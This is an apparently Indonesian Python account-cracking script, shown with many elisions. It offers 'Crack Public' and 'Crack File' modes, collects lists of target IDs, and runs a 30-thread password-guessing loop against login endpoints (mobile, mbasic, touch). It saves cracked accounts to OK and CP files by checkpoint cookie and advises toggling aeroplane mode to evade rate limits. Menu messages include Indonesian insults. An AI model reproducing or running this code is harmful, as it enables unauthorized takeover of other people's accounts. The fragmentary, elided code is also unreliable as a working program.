...
def menu(my_name,my_id):
	...
	cetak(nel('\twelcome [green]%s[purple] HI'%(my_name)))
	alvino_xy(f'{u}ID  : '+str(my_id))
	alvino_xy(f'{h}IP  : {ip}')
	cetak(nel('\t[bold cyan]           â€¢ SELECT OPTION â€¢ [/bold cyan]'))
	print('')
	cetak(nel('[bold green] ðŸ‡®ðŸ‡©1. Crack Public\n  ðŸ‡®ðŸ‡©2. Crack File\n ðŸ‡®ðŸ‡©3. check Crack result\n ðŸ‡®4. exit [bold green]')) 
	...
	if _____cowok__pink_____ in ['1']:
		...
		print('âž¥âž¥âž£SELECT Yang Bener Asu ')
		back()
def error():
	...
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			try:geh = lol[geeh]
				...
				print('âž¥âž¥âž£SELECT Yang Bener Kontol ')
				exit()
		...
		if len(vin)==0:
			...
			try:geh = lol[geeh]
				...
				print('âž¥âž¥âž£SELECT Yang Bener TOLOL ')
				exit()
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('âž¥âž¥âž£HOW MANY IDS DO YOU WANT TO ADD? ? : '))
	except ValueError:
	...
	for met in range(jum):
		yz+=1
		kl = input('âž¥âž¥âž£INPUT ID  '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('')
		print(f'{k}âž¥âž¥âž£Total Idâ˜…{b}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
...
def crack_file():
	...
	if len(vin)==0:
		...
		try:geh = lol[geeh]
			...
			print(f'{k}âž¥âž¥âž£SELECT Yang Bener Kontol {u}')
			time.sleep(3)
			back()
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel('\t[bold cyan]         â€¢ WHICH ACCOUNTS DO YOU WANT TO CRACKâ€¢ [/bold cyan]'))
	print('') 
	cetak(nel('[bold yellow]ðŸ‡®ðŸ‡©âž£1. crack Old \nðŸ‡®ðŸ‡©âž£2. ceack New\nðŸ‡®ðŸ‡©âž£3. Random [bold yellow]'))
	print('')
	hu = input('âž¥âž¥âž£SELECT : ')
	if hu in ['1','01']:
		...
		print('âž¥âž¥âž£SELECT Yang Bener Kontooll ')
		exit()
	cetak(nel('\t[bold cyan]             â€¢ METODE LOGIN â€¢ [/bold cyan]'))
	print('') 
	cetak(nel('[bold purple]ðŸ‡®ðŸ‡©âž£1. Mobile(recommended)\nðŸ‡®ðŸ‡©âž£2. Mbasic(recommended)\nðŸ‡®ðŸ‡©âž£3. Touch\nðŸ‡®ðŸ‡©âž£4. Mtouch [bold purple]')) 
	print('')
	hc = input('>> SELECT : ')
	if hc in ['1','01']:
...
#		method.append('touch')
		...
		method.append('mobile')
	print(f'{m}CATATAN :\nðŸŽ€{k}NOT RECOMMENDED SHOWING APPLICATIONS\nðŸŽ€RECOMMENDED TO USE DEPAULT PASSWORD ') 
	print('')
	_jembot_ = input('âž¥âž¥âž£show apk ( Y/t ) ')
#	if _jembot_ in ['']:
#		print('âž¥âž¥âž£SELECT Yang Bener Kontol ')
#		back()
...
#	else:
#		taplikasi.append('no')
	pwplus=input('âž¥âž¥âž£select Password Manual/depault( m/d ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(nel('[bold cyan]               CRACK STARTED WAIT FOR RESULT[bold cyan]')) 
	print(f'                    {m}H {k}A {h}R {u}A {b}P {u}  â˜…  {b}S {u}A {h} B{k} A{m} R{b}')
	print('')
	print(f'âž¥âž¥âž£ok id {h}saved in : {h}OK/%s {b}'%(okc))
	print(f'âž¥âž¥âž£cp id {k}saved in: {k}CP/%s {b}'%(cpc))
	print(f'âž¥âž¥âž£use aeroplane mode every {h}3{u}minute\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[purple]âž¥âž¥âž£[green] Crack complete[purple] <<[yellow] '))
	print(f'[{h}â€¢{u}]{h} OK : {h}%s '%(ok))
	print(f'{k}[{k}â€¢{h}]{k} CP : {k}%s{u} '%(cp))
	print('')
	print('{k}âž¥âž¥âž£continue crack? ( Y/t ) ? ')
	woi = input('âž¥âž¥âž£SELECT : ')
	if woi in ['y','Y']:
		back()
	else:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     ðŸ˜´ðŸ˜­Mind  CPðŸ˜­ðŸ˜´[red]'))
				...
				cetak(nel('[green]      ðŸŽ€ðŸ¤£ Mind  OK ðŸ¤£ðŸŽ€[green]')) 
